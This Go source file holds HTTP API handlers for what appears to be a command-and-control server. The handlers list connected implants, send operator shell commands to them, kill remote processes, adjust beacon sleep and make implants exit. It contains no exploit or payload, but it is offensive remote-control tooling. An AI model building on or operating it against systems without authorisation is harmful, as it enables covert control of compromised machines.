package api

import (
	"BackendTemplate/pkg/api/communication"
	"BackendTemplate/pkg/cna"
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/connection/kcp"
	"BackendTemplate/pkg/connection/tcp"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/errors"
	"BackendTemplate/pkg/sendcommand"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"bytes"
	"context"
	"fmt"
	"io"
	"log"

	"net/http"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
	"unicode/utf8"

	"github.com/gin-gonic/gin"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

// ===== 核心客户端管理(拆分自原 clients.go) =====

func localGbkToUtf8(data []byte) ([]byte, error) {
	if runtime.GOOS != "windows" {
		return data, nil
	}

	// 先检查是否已经是有效的UTF-8
	if utf8.Valid(data) {
		// 如果已经是有效的UTF-8，但可能是乱码，尝试解码
		// 检查是否包含常见的乱码模式
		str := string(data)
		if strings.Contains(str, "�") || // 替换字符
			strings.Contains(str, "Â") || // 常见GBK乱码
			strings.Contains(str, "æ") || // 常见GBK乱码
			strings.Contains(str, "è") || // 常见GBK乱码
			strings.Contains(str, "é”™è¯¯") || // “错误”的乱码形式
			strings.Contains(str, "æ˜ä»¶") || // “文件”的乱码形式
			strings.Contains(str, "ç®å½•") { // “目录”的乱码形式
			// 这可能是乱码数据，尝试不同的解码方式
			return tryMultipleDecodings(data)
		}
		return data, nil
	}

	// 尝试GBK解码
	reader := transform.NewReader(bytes.NewReader(data), simplifiedchinese.GBK.NewDecoder())
	utf8Data, err := io.ReadAll(reader)
	if err != nil {
		// 如果GBK解码失败，尝试其他解码方式
		return tryMultipleDecodings(data)
	}
	return utf8Data, nil
}

// tryMultipleDecodings 尝试多种解码方式

func tryMultipleDecodings(data []byte) ([]byte, error) {
	// 方法1：尝试GB18030解码
	reader := transform.NewReader(bytes.NewReader(data), simplifiedchinese.GB18030.NewDecoder())
	if utf8Data, err := io.ReadAll(reader); err == nil && utf8.Valid(utf8Data) {
		return utf8Data, nil
	}

	// 方法2：尝试将字符串按照单字节处理，重新解释为GBK
	str := string(data)
	if len(str) > 0 {
		// 将字符串转换为字节数组再进行GBK解码
		bytesData := make([]byte, len(str))
		for i, r := range str {
			bytesData[i] = byte(r)
		}
		reader := transform.NewReader(bytes.NewReader(bytesData), simplifiedchinese.GBK.NewDecoder())
		if utf8Data, err := io.ReadAll(reader); err == nil && utf8.Valid(utf8Data) {
			return utf8Data, nil
		}
	}

	// 如果所有解码尝试都失败，返回原始数据
	return data, nil
}

// 全局编码处理器实例
var encodingProcessor = utils.NewChineseEncodingProcessor(false) // 启用调试模式

// processShellData 处理Shell数据的编码

func processShellData(data []byte) ([]byte, error) {
	return encodingProcessor.ProcessShellOutput(data)
}

// processShellContent 处理Shell内容字符串的编码

func processShellContent(content string) string {
	return encodingProcessor.ProcessDatabaseContent(content)
}

func GetClients(c *gin.Context) {
	var clientGet struct {
		Page     int `form:"page"`
		PageSize int `form:"page_size"`
	}
	if err := c.ShouldBindQuery(&clientGet); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	// 【优化】SQL 级分页，不再每请求全表扫描再内存截断
	page := clientGet.Page
	if page <= 0 {
		page = 1
	}
	// 【P2-1】page_size 上限 100：防止 page_size=10000000 拉全表（SQLite 全表扫描 + 内存放大）
	size := clientGet.PageSize
	if size <= 0 {
		size = 20
	}
	if size > 100 {
		size = 100
	}

	total, _ := database.Clients_().Count()

	// 【P2-1】按 ID 降序分页：数据变动时翻页稳定，最新客户端在前
	// （原无 OrderBy 依赖 SQLite rowid 序，插删后翻页重复/遗漏）
	clientData, err := database.Clients_().Page((page-1)*size, size)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": errors.SanitizeError(err)})
		return
	}

	// 附加最后活跃时间（在线客户端取实时心跳时间，离线取数据库记录）
	type clientWithActive struct {
		database.Clients
		LastActive string `json:"last_active"`
	}
	enriched := make([]clientWithActive, 0, len(clientData))
	for _, cl := range clientData {
		la := resolveClientLastActive(&cl)
		cl.LastActive = la
		enriched = append(enriched, clientWithActive{Clients: cl})
	}

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": gin.H{
		"list":  enriched,
		"total": total,
	}})
}

// resolveClientLastActive 获取客户端最后活跃时间并懒更新到数据库。
// 在线客户端优先取各协议心跳记录，离线客户端回退数据库 LastActive / FirstStart。

func resolveClientLastActive(client *database.Clients) string {
	uid := client.Uid
	var lastActive time.Time

	switch client.Listener {
	case "tcp":
		tcp.Mutex.Lock()
		if ct, ok := tcp.ClientTimeManager[uid]; ok && ct != nil && !ct.LastHeartbeat.IsZero() {
			lastActive = ct.LastHeartbeat
		}
		tcp.Mutex.Unlock()
	case "kcp":
		kcp.Mutex.Lock()
		if ct, ok := kcp.ClientTimeManager[uid]; ok && ct != nil && !ct.LastHeartbeat.IsZero() {
			lastActive = ct.LastHeartbeat
		}
		kcp.Mutex.Unlock()
	// websocket 不再单独维护 ClientTimeManager（B3 重构后走统一离线检测器），
	// 直接落入 default 分支的 GetLastActive（WS 每条消息都会 Touch 检测器）
	case "http", "https":
		communication.MuClientManager.Lock()
		if ct, ok := communication.ClientTimeManager[uid]; ok && ct != nil && !ct.LastHeartbeat.IsZero() {
			lastActive = ct.LastHeartbeat
		}
		communication.MuClientManager.Unlock()
	default:
		if connection.GlobalOfflineDetector != nil {
			if la, _, ok := connection.GlobalOfflineDetector.GetLastActive(uid); ok && !la.IsZero() {
				lastActive = la
			}
		}
	}

	if lastActive.IsZero() {
		// 离线或未知协议：回退数据库记录
		if client.LastActive != "" {
			return client.LastActive
		}
		return client.FirstStart
	}

	// 【优化】异步批量更新数据库（便于离线后统计离线时长），不再逐客户端同步 UPDATE
	formatted := lastActive.Format("2006-01-02 15:04:05")
	if client.LastActive != formatted {
		database.QueueLastActiveUpdate(uid, formatted)
	}
	return formatted
}

func SendCommands(c *gin.Context) {
	var commands struct {
		Uid     string `form:"uid"`
		Command string `json:"command"`
	}
	if err := c.ShouldBindJSON(&commands); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 协作：会话被其他操作员占用时拒绝下发（无人持锁则行为不变）
	if !checkSessionLock(c, commands.Uid) {
		return
	}

	// CNA alias 拦截：命令首词匹配脚本注册的 alias 时，由脚本引擎执行（不下发客户端）
	if cna.Global != nil && commands.Command != "" {
		fields := strings.Fields(commands.Command)
		if res, hit := cna.Global.ExecAlias(fields[0], fields[1:], commands.Uid); hit {
			c.JSON(http.StatusOK, gin.H{
				"status": http.StatusOK,
				"data": gin.H{
					"alias":  true,
					"output": res.Output,
				},
				"error": res.Error,
			})
			return
		}
	}

	// 添加命令到历史，确保UTF-8编码（增量追加，免读改写整 blob）
	commandLine := "$ " + commands.Command + "\n"
	database.AppendShellContent(commands.Uid, commandLine)

	// 任务一等对象：控制台命令也落库（谁/何时/对哪个 beacon/发了什么），
	// 投递失败如实标 failed（原来一律"已下发"）。
	if _, rows := createTaskRows([]string{commands.Uid}, operatorFromContext(c), "console", commands.Command); len(rows) > 0 {
		if err := sendcommand.SendCommandChecked(commands.Uid, commands.Command); err != nil {
			finishTask(rows[0].Id, taskStatusFailed, "", err.Error())
		}
	} else {
		sendcommand.SendCommand(commands.Uid, commands.Command)
	}

	// 操作广播：让其他操作员看到"谁对哪台机器下了什么"（截断，避免长命令刷屏）
	publishOperatorAction(commands.Uid, operatorFromContext(c), "command", truncateForEvent(commands.Command))

	// 不再全量读取 shell blob 回显（避免长会话 5MB 级 IO/转码），返回成功状态即可
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": ""})
}

func GetShellContent(c *gin.Context) {
	// 兼容两种取参方式：
	// - /client/shell/getshellcontent?uid=xxx （前端 API 用查询参数）
	// - /client/shell/history/:uid （路径参数）
	uid := c.Param("uid")
	if uid == "" {
		uid = c.Query("uid")
	}
	if uid == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "UID不能为空"})
		return
	}

	// 长会话内容仅处理尾部（避免 5MB 级全量读+多轮转码的 CPU/IO 放大）
	const maxShellTail = 512 * 1024 // 512KB

	// 【性能优化】SQL 侧截断：只读尾部 512KB，避免轮询接口每次全量加载整行。
	// 跨方言：SQLite substr(x,-n) / PostgreSQL right(x,n)，见 database.LoadShellTail。
	content, err := database.LoadShellTail(uid, maxShellTail)
	if err != nil {
		logx.Warnf("⚠️ 读取Shell内容失败: uid=%s, err=%v\n", uid, err)
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "error": "读取Shell内容失败"})
		return
	}

	// 对Shell内容进行编码处理，确保中文正确显示
	processedContent := processShellContent(content)

	// 返回处理后的UTF-8编码内容，支持中文显示
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": processedContent})
}

func GetPidList(c *gin.Context) {
	var shellContent struct {
		Uid string `form:"uid"`
	}
	if err := c.ShouldBindQuery(&shellContent); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	// 客户端不在线时立即返回：否则会一直等到超时，而等待时长一旦超过服务端
	// write_timeout（30s），408 响应已经写不出去，浏览器只能收到一个空 500。
	connection.MuClientListenerType.Lock()
	_, connected := connection.ClientListenerType[shellContent.Uid]
	connection.MuClientListenerType.Unlock()
	if !connected {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "客户端未连接，请确保客户端正在运行并已连接到服务器",
			"code":  "CLIENT_NOT_CONNECTED",
			"uid":   shellContent.Uid,
		})
		return
	}

	// 创建 UID 对应的通道队列
	queue := command.VarPidQueue.GetOrCreateQueue(shellContent.Uid)

	sendcommand.SendCommand(shellContent.Uid, "ps")

	// 等待客户端回包：必须短于服务端 write_timeout(30s)，否则超时响应写不出去
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case pids := <-queue:
		pidStruct := utils.ParsePid(pids)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": pidStruct})
	case <-command.GetClientOfflineSignal(shellContent.Uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
		return
	case <-ctx.Done():
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
	}
}

func KillPid(c *gin.Context) {
	var pidBody struct {
		Uid string `json:"uid"`
		Pid string `json:"pid"`
	}
	if err := c.ShouldBindJSON(&pidBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	sendcommand.SendCommand(pidBody.Uid, "kill "+pidBody.Pid)
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": "killed"})
}

func GetNote(c *gin.Context) {
	var noteBody struct {
		Uid string `form:"uid"`
	}
	if err := c.ShouldBindQuery(&noteBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	Note, _, _ := database.NotesStore_().GetByUID(noteBody.Uid)
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": Note.Note})
}

func SaveNote(c *gin.Context) {
	var noteBody struct {
		Uid         string `json:"uid"`
		NoteContent string `json:"noteContent"`
	}
	if err := c.ShouldBindJSON(&noteBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if noteBody.Uid == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "uid 不能为空"})
		return
	}
	// Upsert 收口到领域层：原来的"先查再决定 Update/Insert"写在调用方，
	// 一旦有人只写 Update 分支，无记录客户端的备注就会静默丢失。
	if err := database.NotesStore_().Upsert(noteBody.Uid, noteBody.NoteContent); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "保存备注失败"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

func ExitClient(c *gin.Context) {
	var clientBody struct {
		Uid string `form:"uid"`
	}
	if err := c.BindQuery(&clientBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	sendcommand.SendCommand(clientBody.Uid, "exit")

	go func() {
		var client database.Clients
		client, _, _ = database.Clients_().GetByUID(clientBody.Uid)
		duration, _ := time.ParseDuration(client.Sleep + "s")
		time.Sleep(duration)
		// 级联删除走领域层唯一出口：收口前这里漏删 loot（战利品会永远挂在已删除的 uid 上）
		database.Clients_().PurgeByUID(clientBody.Uid)
		command.ClearUidFileBrowser(clientBody.Uid)
	}()

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

func AddUidNote(c *gin.Context) {
	var noteBody struct {
		Uid  string `json:"uid"`
		Note string `json:"note"`
	}
	if err := c.BindJSON(&noteBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 【零值修复】xorm 默认跳过零值字段，显式 Cols 保证清空 note 也能生效
	_, _ = database.Clients_().UpdateColumns(noteBody.Uid, []string{"note"}, &database.Clients{Note: noteBody.Note})
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

func EditSleep(c *gin.Context) {
	var sleepBody struct {
		Uid   string `json:"uid"`
		Sleep string `json:"sleep"`
	}
	if err := c.BindJSON(&sleepBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	// 【零值修复】xorm 默认跳过零值字段，显式 Cols 保证清空 sleep 也能生效。
	// 统一 1-300s 钳制（与客户端 CmdSleep 一致，防下标异常/值域分裂）
	sec, secErr := strconv.Atoi(sleepBody.Sleep)
	normalized := sleepBody.Sleep
	if secErr == nil {
		if sec < 1 {
			sec = 1
		}
		if sec > 300 {
			sec = 300
		}
		normalized = strconv.Itoa(sec)
	}
	_, _ = database.Clients_().UpdateColumns(sleepBody.Uid, []string{"sleep"}, &database.Clients{Sleep: normalized})
	sendcommand.SendCommand(sleepBody.Uid, "sleep "+normalized)

	// 同步离线检测器的休眠间隔，防止 sleep 调整后在线客户端被误判离线
	if secErr == nil && sec > 0 {
		if connection.GlobalOfflineDetector != nil {
			connection.GlobalOfflineDetector.UpdateSleep(sleepBody.Uid, sec)
		}
	}

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

func EditColor(c *gin.Context) {
	var colorBody struct {
		Uid   string `json:"uid"`
		Color string `json:"color"`
	}
	if err := c.BindJSON(&colorBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	// 【零值修复】xorm 默认跳过零值字段，显式 Cols 保证清空 color 也能生效
	_, _ = database.Clients_().UpdateColumns(colorBody.Uid, []string{"color"}, &database.Clients{Color: colorBody.Color})
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

// TakeScreenshot 取远程屏幕截图

func BatchDeleteClients(c *gin.Context) {
	var requestBody struct {
		UIDs []string `json:"uids"`
	}
	if err := c.ShouldBindJSON(&requestBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	if len(requestBody.UIDs) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "没有提供要删除的UID"})
		return
	}

	// 【优化】批量在线状态一次查询；DB 删除放入单个事务（4 张表 × N 次写合并为一次提交）
	var onlineClients []database.Clients
	onlineClients, _ = database.Clients_().OnlineByUIDs(requestBody.UIDs)
	for _, c := range onlineClients {
		sendcommand.SendCommand(c.Uid, "exit")
	}

	session := database.DB().NewSession()
	defer session.Close()
	if err := session.Begin(); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": errors.SanitizeError(err)})
		return
	}
	for _, uid := range requestBody.UIDs {
		// 清理连接类型映射与内存队列
		connection.MuClientListenerType.Lock()
		delete(connection.ClientListenerType, uid)
		connection.MuClientListenerType.Unlock()
		// J1: 经锁封装删除（原绕过 fileBrowserMu 直接 delete → 与 ParseDirectoryString/ParseDrives 并发 map 竞争）
		command.ClearUidFileBrowser(uid)

		session.In("uid", requestBody.UIDs).Delete(&database.Clients{})
		session.In("uid", requestBody.UIDs).Delete(&database.Shell{})
		session.In("uid", requestBody.UIDs).Delete(&database.Downloads{})
		session.In("uid", requestBody.UIDs).Delete(&database.Notes{})
	}
	if err := session.Commit(); err != nil {
		session.Rollback()
		log.Printf("[CLIENT-API] ❌ 批量删除事务失败: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": errors.SanitizeError(err)})
		return
	}

	response := gin.H{
		"status":        http.StatusOK,
		"message":       fmt.Sprintf("批量删除完成: %d 个", len(requestBody.UIDs)),
		"success_count": len(requestBody.UIDs),
		"failed_count":  0,
		"total_count":   len(requestBody.UIDs),
	}
	c.JSON(http.StatusOK, response)
}

// DisconnectClient 断开客户端连接：向客户端发送 exit 命令使其退出，
// 但保留数据库中的客户端记录与历史（区别于 ExitClient 的删除语义）。

func DisconnectClient(c *gin.Context) {
	var clientBody struct {
		Uid string `form:"uid"`
	}
	if err := c.BindQuery(&clientBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if clientBody.Uid == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "uid不能为空"})
		return
	}
	sendcommand.SendCommand(clientBody.Uid, "exit")
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

// ResetClientId 重置客户端 ID：把现有会话按当前顺序重排为 1..N，并复位自增序列。
//
// 语义边界（前端会照此提示操作员）：
//   - 只动 clients 表的自增主键，**不动 Uid**——Uid 才是会话的真身，
//     命令下发/审计/回连全按 Uid 走，重排 ID 不会影响任何在线的载荷;
//   - 历史日志里如果按 ID 记过"第几个会话"，重排后会与当时的编号不一致;
//   - 两阶段写（先写负值再写正值）是必须的：正序直接改会把 2 改成 1 时撞上还没挪走的 1。
func ResetClientId(c *gin.Context) {
	if database.DB() == nil || database.Engine == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "data": "数据库引擎未初始化"})
		return
	}

	clients, err := database.Clients_().All()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "data": "读取客户端列表失败"})
		return
	}

	// 按现有 ID 升序 = 会话第一次上线的顺序；重排后这个顺序保持不变
	sort.SliceStable(clients, func(i, j int) bool { return clients[i].ID < clients[j].ID })

	total := len(clients)
	for i, cl := range clients {
		if _, err := database.Engine.Exec("UPDATE clients SET id = ? WHERE uid = ?", -(i + 1), cl.Uid); err != nil {
			log.Printf("[CLIENT-API] ❌ 重置ID失败(阶段1 %s): %v", cl.Uid, err)
			c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "data": "重置ID失败（已部分写入，建议重跑一次）"})
			return
		}
	}
	for i, cl := range clients {
		if _, err := database.Engine.Exec("UPDATE clients SET id = ? WHERE uid = ?", i+1, cl.Uid); err != nil {
			log.Printf("[CLIENT-API] ❌ 重置ID失败(阶段2 %s): %v", cl.Uid, err)
			c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "data": "重置ID失败（已部分写入，建议重跑一次）"})
			return
		}
	}

	// 自增序列复位到 N：下一个新会话从 N+1 开始，且不会回填空洞
	if err := database.ResetAutoIncrement("clients", int64(total)); err != nil {
		log.Printf("[CLIENT-API] ❌ 重置ID失败(写入序列): %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "data": "重置ID失败（序列未复位）"})
		return
	}

	log.Printf("[CLIENT-API] ♻️ 客户端ID序列已重置：%d 个会话重排为 1..%d", total, total)
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": map[string]interface{}{
		"renumbered": total,
		"next_id":    total + 1,
	}})
}

// CopyFile 复制文件/目录（客户端执行 cp，保留原文件）

func nextRequestId() uint32 {
	return atomic.AddUint32(&requestIdCounter, 1)
}
